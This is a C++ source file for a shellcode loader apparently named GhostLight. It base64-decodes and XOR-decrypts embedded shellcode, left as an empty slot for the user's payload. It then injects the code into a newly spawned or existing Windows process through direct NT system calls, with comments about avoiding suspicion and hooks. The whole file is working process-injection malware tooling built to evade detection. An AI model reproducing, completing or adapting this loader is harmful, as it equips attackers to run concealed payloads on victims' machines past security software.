// GhostLight.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include "base64.h"
#include <string>
#include "ghostcalls.h"


using std::cout;
using std::wcout;
using std::endl;
using std::string;

// DATA TYPES
enum ExecutionMode {
	EXEC = 1,
	PID = 2
};

// GLOBALS
bool DEBUG_MODE = false;
ExecutionMode E_MODE;
int TARGET_PID;
char* LAUNCH_COMMAND;


// THE DECRYPT METHOD, THIS IS SOMETHING THAT NEEDS TO BE WRITTEN DEPENDING ON HOW YOUR SC IS GENERATED/ENCRYPTED
// DECRYPT IN PLACE OR CREATE ANEW ONE, BUT RETURN IT EITHER WAY
unsigned char* decrypt(unsigned char*, size_t);

// THE RUNNER METHOD, THIS IS PROVIDED
void run(unsigned char*, size_t); 
void DisplayError(DWORD NTStatusMessage);

int main(int argc, char** argv)
{
	// HANDLE ARGUMENT FOR PROCESS TO SPAWN
	if (argc < 3) {
		cout << "Invalid usage!" << endl;
		exit(1);
	}

	// DEAL WITH DEBUG MODE
	if (argc >= 4) {
		char d[] = "debug";
		if (strcmp(argv[3], d) == 0) {
			cout << "Debug mode!" << endl;
			DEBUG_MODE = true;
		}
	}

	if (DEBUG_MODE) {
		for (size_t i = 0; i < argc; i++) {
			cout << i << ": " << argv[i] << endl;
		}
	}

	// HANDLE MODE ARGUMENT
	char* modeStr = argv[1];
	char* argString = argv[2];
	if (strcmp(modeStr, "PID") == 0) {
		// EXECUTE BY CREATING A NEW PROCESS TO INJECT INTO
		E_MODE = PID;
		TARGET_PID = atoi(argString);

	}
	else if (strcmp(modeStr, "EXEC") == 0) {
		// EXECUTE BY INJECTING INTO AN EXISTING PROCESS WITH PID
		E_MODE = EXEC;
		LAUNCH_COMMAND = argString;

	}
	else {
		if (DEBUG_MODE) cout << "Error with execution mode: must be EXEC or PID" << endl;
		exit(2);
	}


	// IMPORTANT! BASE64 ENCODED SC GOES HERE
	string encodedBytes = "";
	// BASE64 DECODE THE STRING TO GET BYTES
	string decodedBytes = base64_decode(encodedBytes);
	unsigned char* encryptedBytes = (unsigned char*)decodedBytes.c_str();
	size_t bufLen = decodedBytes.length();

	// DECRYPT THE BYTES
	unsigned char* decr = decrypt(encryptedBytes, bufLen);

	// RUN THE SC
	run(decr, bufLen);

	return 0;

}


// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
unsigned char* decrypt(unsigned char* encryptedBytes, size_t length) {

	const unsigned char xKey = 35;

	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE

	for (size_t i = 0; i < length; i++) {
		decrData[i] = encryptedBytes[i] ^ xKey;
	}
	decrData[length] = '\x00';
	return decrData;
}

void run(unsigned char* sc, size_t scLen) {

	// NOW THE FUN BEGINS
	HANDLE processHandle = NULL;
	HANDLE remoteThread;
	PVOID remoteBuffer = NULL;
	BOOL success;
	SIZE_T bytesWritten = 0;
	ULONG oldProtectOption = 0;



	// SWITCH DEPENDING ON THE EXECUTION MODE
	// TODO: COULD USE CUSTOM SYSCALLS FOR THESE TOO, BUT IT'S COMPLEX TO CREATE A NEW PROCESS BECAUSE I NEED TO CREATE A NEW SECTION TO EXECUTE AND ALL THAT
	if (E_MODE == EXEC) {


		// EXECUTE AN APPLICATION LIKE IEXPLORE TO TARGET
		LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
		LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
		success = CreateProcessA(
			NULL,
			LAUNCH_COMMAND,
			NULL,
			NULL,
			NULL,
			NORMAL_PRIORITY_CLASS,
			NULL,
			NULL,
			pStartupInfo,
			pProcessInfo
		);
		if (!success) {
			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " failed: " << success << endl;
			exit(3);
		}
		else {
			if (DEBUG_MODE) cout << "Create Process for " << LAUNCH_COMMAND << " succeeded!" << endl;
		}

		// GET THE PROCESS HANDLE
		processHandle = pProcessInfo->hProcess;
	}
	else if (E_MODE == PID) {

		// OPEN PROCESS WITH THE TARGET PID
		processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)TARGET_PID);
	}
	if (!processHandle) {
		if (DEBUG_MODE) cout << "Failed to get process Handle." << endl;

		exit(4);
	}
	else {
		if (DEBUG_MODE)  cout << "Got process handle!" << endl;
	}


	// ALLOCATE SPACE INSIDE THE REMOTE PROCESS
	NtAllocateVirtualMemory(processHandle, &remoteBuffer, 0, &scLen, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (!remoteBuffer) {
		if (DEBUG_MODE) cout << "Unable to allocate virtual memory. RemoteBuffer: " << remoteBuffer << endl;
		exit(5);
	}
	else {
		if (DEBUG_MODE) cout << "Successfully allocated virtual memory at " << remoteBuffer << endl;
	}

	// WRITE SHELLCODE INTO THE SPACE
	NtWriteVirtualMemory(processHandle, remoteBuffer, sc, scLen, &bytesWritten);
	if (bytesWritten < scLen) {
		if (DEBUG_MODE) cout << "Failed to write entire sc: wrote " << bytesWritten << " out of " << scLen << " bytes." << endl;
		exit(6);
	}
	else {
		if (DEBUG_MODE) cout << "Wrote full sc to process memory" << endl;
	}

	// REPROTECT THE MEMORY TO EXECUTE ONLY SO IT'S NOT SUS
	NtProtectVirtualMemory(processHandle, &remoteBuffer, &scLen, PAGE_EXECUTE, &oldProtectOption);
	if (!oldProtectOption) {
		if (DEBUG_MODE) cout << "Unable to update protection (" << oldProtectOption << ")" << endl;
		exit(7);
	}
	else {
		if (DEBUG_MODE) cout << "Successfully changed sc memory protection to execute only" << endl;
	}

	// CREATE THREAD
	NtCreateThreadEx(&remoteThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuffer, NULL, FALSE, 0, 0, 0, nullptr);

	NtClose(processHandle);

	exit(0);
}